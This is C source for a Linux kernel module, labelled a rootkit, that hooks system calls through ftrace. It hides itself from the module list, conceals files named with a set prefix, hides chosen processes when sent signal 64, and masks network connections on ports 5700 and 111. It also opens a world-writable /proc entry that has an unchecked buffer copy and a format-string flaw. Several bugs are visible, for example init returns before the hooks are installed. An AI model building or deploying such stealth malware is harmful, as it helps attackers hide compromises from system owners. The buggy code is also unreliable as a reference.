#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/dirent.h>
#include <linux/limits.h>
#include <linux/tcp.h>
#include <linux/fs.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>
#include <linux/types.h>
#include <linux/signal.h>

#include "ftrace_hook.h"

#define MAX_LENGTH 256

#define PREFIX "hide_file"

#define true 1
#define false 0

#define ERROR_HANDLE(buffer1, ret) \
    {kfree(buffer1); return (ret);}

static asmlinkage long (*orig_kill)(const struct pt_regs *);

static asmlinkage long (*orig_getdents64)(const struct pt_regs *);
static asmlinkage long (*orig_getdents)(const struct pt_regs *);

static asmlinkage int (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);
static asmlinkage int (*orig_tcp6_seq_show)(struct seq_file *seq, void *v);
static asmlinkage int (*orig_udp4_seq_show)(struct seq_file *seq, void *v);
static asmlinkage int (*orig_udp6_seq_show)(struct seq_file *seq, void *v);

static int hidden = 0;

static char hide_pid[NAME_MAX];

static struct list_head *prev_module;

static char *str;

struct proc_dir_entry {
	/*
	 * number of callers into module in progress;
	 * negative -> it's going away RSN
	 */
	atomic_t in_use;
	refcount_t refcnt;
	struct list_head pde_openers;	/* who did ->open, but not ->release */
	/* protects ->pde_openers and all struct pde_opener instances */
	spinlock_t pde_unload_lock;
	struct completion *pde_unload_completion;
	const struct inode_operations *proc_iops;
	const struct file_operations *proc_fops;
	const struct dentry_operations *proc_dops;
	union {
		const struct seq_operations *seq_ops;
		int (*single_show)(struct seq_file *, void *);
	};
	proc_write_t write;
	void *data;
	unsigned int state_size;
	unsigned int low_ino;
	nlink_t nlink;
	kuid_t uid;
	kgid_t gid;
	loff_t size;
	struct proc_dir_entry *parent;
	struct rb_root subdir;
	struct rb_node subdir_node;
	char *name;
	umode_t mode;
	u8 namelen;
	char inline_name[];
} __randomize_layout;


struct hide_pids {
    char *pid;
    struct list_head list;
};

struct hide_ports {
    unsigned short port;
    struct list_head list;
};

/* ---------------hide module start ----------------*/
void hideme(void) {
    prev_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
}

void showme(void) {
    list_add_tail(&THIS_MODULE->list, prev_module);
}

static int hide_module(void) {
    if (hidden == 0) {
        printk(KERN_INFO "rootkit: hideme...\n");
        hideme();
        hidden = 1;
    } else {
        printk(KERN_INFO "rootkit: showme...\n");
        showme();
        hidden = 0;
    }
    return 0;
}

/* ---------------hide module end ----------------*/


/* ---------------hook getdents start------------------*/ 

// sys_getdents64与隐藏文件的区别是，需要判断hide_pid是不是为空
static asmlinkage long hook_sys_getdents64(const struct pt_regs * regs) {
    // struct linux_dirent64 *current_dir, *dirent_ker, *dirent_tmp = NULL;
    struct linux_dirent64 *current_dir, *previous_dir, *dirent_ker = NULL;
    unsigned long offset_ker = 0;
    // unsigned long offset_tmp = 0;

    long error;

    int ret = orig_getdents64(regs);

    struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;

    dirent_ker = kzalloc(ret, GFP_KERNEL);
    // dirent_tmp = kzalloc(ret, GFP_KERNEL);
    if ((ret <= 0) || (dirent_ker == NULL))
        return ret;

    error = copy_from_user(dirent_ker, dirent, ret);
    if (error)
        ERROR_HANDLE(dirent_ker, ret);

    while (offset_ker < ret) {
        current_dir = (void *)dirent_ker + offset_ker;
        // printk(KERN_INFO "filename: %s\n", current_dir->d_name);
        if (strlen(hide_pid) > 0 && strlen(hide_pid) == strlen(current_dir->d_name) && memcmp(hide_pid, current_dir->d_name, strlen(hide_pid)) == 0) {
            // printk(KERN_INFO "rootkit: hide_pid: %s\n", current_dir->d_name);
            if (current_dir == dirent_ker) {
                ret -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                continue;
            }
            previous_dir->d_reclen += current_dir->d_reclen;
            printk(KERN_INFO "rootkit: hide_pid: %s\n", hide_pid);
        } else if (memcmp(PREFIX, current_dir->d_name, strlen(PREFIX)) == 0) {
            printk(KERN_INFO "rootkit: Found %s\n", current_dir->d_name);
            if (current_dir == dirent_ker) {
                ret -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                continue;
            }
            previous_dir->d_reclen += current_dir->d_reclen;
        } else {
            // memcpy((void *)dirent_tmp + offset_tmp, (void *)dirent_ker + offset_ker, current_dir->d_reclen);
            // offset_tmp += current_dir->d_reclen;
            previous_dir = current_dir;
        }
        offset_ker += current_dir->d_reclen;
    }
    error = copy_to_user(dirent, dirent_ker, ret);
    if (error)
        ERROR_HANDLE(dirent_ker, ret);
    kfree(dirent_ker);
    return ret;
}

static asmlinkage long hook_sys_getdents(const struct pt_regs * regs) {
    struct linux_dirent {
        unsigned long d_ino;
        unsigned long d_off;
        unsigned short d_reclen;
        char d_name[];
    };
    struct linux_dirent __user *dirent = (struct linux_dirent *) regs->si;
    struct linux_dirent *current_dir, *previous_dir, *dirent_ker = NULL; 
    unsigned long offset_ker = 0;

    long error;

    int ret = orig_getdents(regs);
    dirent_ker = kzalloc(ret, GFP_KERNEL);

    if ((ret <= 0) || (dirent_ker == NULL))
        return ret;

    error = copy_from_user(dirent_ker, dirent, ret);
    if (error)
        ERROR_HANDLE(dirent_ker, ret);
    
    while (offset_ker < ret) {
        current_dir = (void *)dirent_ker + offset_ker;
        if (strlen(hide_pid) > 0 && strlen(hide_pid) == strlen(current_dir->d_name) && memcpy(hide_pid, current_dir->d_name, strlen(hide_pid)) == 0) {
            if (current_dir == dirent_ker) {
			 	ret -= current_dir->d_reclen;
			 	memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
			 	continue;
			}
			previous_dir->d_reclen += current_dir->d_reclen;
			printk(KERN_INFO "hide_pid: %s\n", hide_pid);
        } else if (memcmp(PREFIX, current_dir->d_name, strlen(PREFIX)) == 0) {
            //printk(KERN_INFO "rootkit: Found %s\n", current_dir->d_name);
            if (current_dir == dirent_ker) {
			 	ret -= current_dir->d_reclen;
			 	memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
			 	continue;
			}
			previous_dir->d_reclen += current_dir->d_reclen;
			printk(KERN_INFO "rootkit: Found %s\n", current_dir->d_name);
        } else {
            // memcpy((void *)dirent_tmp + offset_tmp, (void *)dirent_ker + offset_ker, current_dir->d_reclen);
            // offset_tmp += current_dir->d_reclen;
            previous_dir = current_dir;
        }
        offset_ker += current_dir->d_reclen;
    }
    error = copy_to_user(dirent, dirent_ker, ret);
    if (error)
        ERROR_HANDLE(dirent_ker, ret);
    kfree(dirent_ker);
    return ret;
}

/* ---------------hook getdents end------------------*/ 

/*---------------hook kill start-------------------*/
static asmlinkage int hook_kill(const struct pt_regs *regs) {
    int sig = regs->si;
    pid_t pid = regs->di;

    if (sig == 64) {
        printk(KERN_INFO "signal received ...\n");
        if (pid == 0)
            return hide_module();
        else {
            printk(KERN_INFO "rootkit: hiding process with pid %d\n", pid);
            sprintf(hide_pid, "%d", pid);
            // printk(KERN_INFO "hide_pid: %s\n", hide_pid);
            return 0;
        }
    }

    return orig_kill(regs);
}
/*---------------hook kill end-------------------*/

/*---------------hide port start------------------*/
LIST_HEAD(hide_ports_list);

static unsigned int find_port(unsigned short sport, unsigned short dport) {
    struct hide_ports *h;
    list_for_each_entry(h, &hide_ports_list, list) {
        if (h->port == sport || h->port == dport) {
            return true;
        }
    }
    return false;
}
 
static asmlinkage int hook_tcp4_seq_show(struct seq_file *seq, void *v) {
    struct inet_sock *is;
    unsigned short port = htons(5700);

    // if (v != SEQ_START_TOKEN) {
    //     is = (struct inet_sock *)v;
    //     if (find_port())
    // }

    if (v != SEQ_START_TOKEN) {
        is = (struct inet_sock *)v;
        if (port == is->inet_sport || port == is->inet_dport) {
            printk(KERN_DEBUG "rootkit: sport: %d, dport: %d\n", ntohs(is->inet_sport), ntohs(is->inet_dport));
            return 0;
        }
    }
    return orig_tcp4_seq_show(seq, v);
}

static asmlinkage int hook_tcp6_seq_show(struct seq_file *seq, void *v) {
    struct inet_sock *is;
    unsigned short port = htons(5700);
    if (v != SEQ_START_TOKEN) {
        is = (struct inet_sock *)v;
        if (port == is->inet_sport || port == is->inet_dport) {
            printk(KERN_DEBUG "rootkit: sport: %d, dport: %d\n", ntohs(is->inet_sport), ntohs(is->inet_dport));
            return 0;
        }
    }
    return orig_tcp6_seq_show(seq, v);
}

static asmlinkage int hook_udp4_seq_show(struct seq_file *seq, void *v) {
    struct inet_sock *is;
    unsigned short port = htons(111);
    if (v != SEQ_START_TOKEN) {
        is = (struct inet_sock *)v;
        if (port == is->inet_sport || port == is->inet_dport) {
            printk(KERN_DEBUG "rootkit: sport: %d, dport: %d\n", ntohs(is->inet_sport), ntohs(is->inet_dport));
            return 0;
        }
    }
    return orig_udp4_seq_show(seq, v);
}

static asmlinkage int hook_udp6_seq_show(struct seq_file *seq, void *v) {
    struct inet_sock *is;
    unsigned short port = htons(111);
    if (v != SEQ_START_TOKEN) {
        is = (struct inet_sock *)v;
        if (port == is->inet_sport || port == is->inet_dport) {
            printk(KERN_DEBUG "rootkit: sport %d, dport: %d\n", ntohs(is->inet_sport), ntohs(is->inet_dport));
            return 0;
        }
    }
    return orig_udp6_seq_show(seq, v);
}
/*---------------hide port end------------------*/

/*---------------read and write on proc start-----------------*/
static ssize_t write(struct file *file, const char __user *buffer, size_t count, loff_t *f_pos) {
    if (copy_from_user(str, buffer, count)) {
        return -1;
    }
    printk(KERN_INFO "write from user: %s\n", str);
    return count;
}

static int proc_show(struct seq_file *m, void *v) {
    seq_printf(m, str);
    return 0;
}

static int proc_open(struct inode *inode, struct file *file) {
    return single_open(file, &proc_show, NULL);
}

static const struct file_operations file_fops = {
    .write = write,
    .owner = THIS_MODULE,
    .open = proc_open,
    .read = seq_read,
    .llseek = seq_lseek,
    .release = single_release,
};
/*---------------read and write on proc end----------------*/

static struct ftrace_hook hooks[] = {
    HOOK("__x64_sys_getdents64", hook_sys_getdents64, &orig_getdents64),
    HOOK("__x64_sys_getdents", hook_sys_getdents, &orig_getdents),

    HOOK("__x64_sys_kill", hook_kill, &orig_kill),

    HOOK("tcp4_seq_show", hook_tcp4_seq_show, &orig_tcp4_seq_show),
    HOOK("tcp6_seq_show", hook_tcp6_seq_show, &orig_tcp6_seq_show),
    HOOK("udp4_seq_show", hook_udp4_seq_show, &orig_udp4_seq_show),
    HOOK("udp6_seq_show", hook_udp6_seq_show, &orig_udp6_seq_show),
};

static int __init rootkit_init(void) {
    int err;
    struct proc_dir_entry *entry;

    // create channel under /proc
    str = kzalloc(100, GFP_KERNEL);
    entry = proc_create("test", 0666, NULL, &file_fops);
    if (!entry) {
        printk(KERN_INFO "test create error\n");
        return -1;
    } else {
        printk(KERN_INFO "test create successfully\n");
        return 0;
    }

    //hook syscalls in kernel
    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if (err) 
        return err;
 
    printk(KERN_INFO "rootkit: Loaded :-)\n");
    return 0;
}

static void __exit rootkit_exit(void) {
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
    remove_proc_entry("test", NULL);
    printk(KERN_INFO "rootkit: Unloaded :-(\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("clf");
MODULE_DESCRIPTION("rootkit");
MODULE_VERSION("0.01");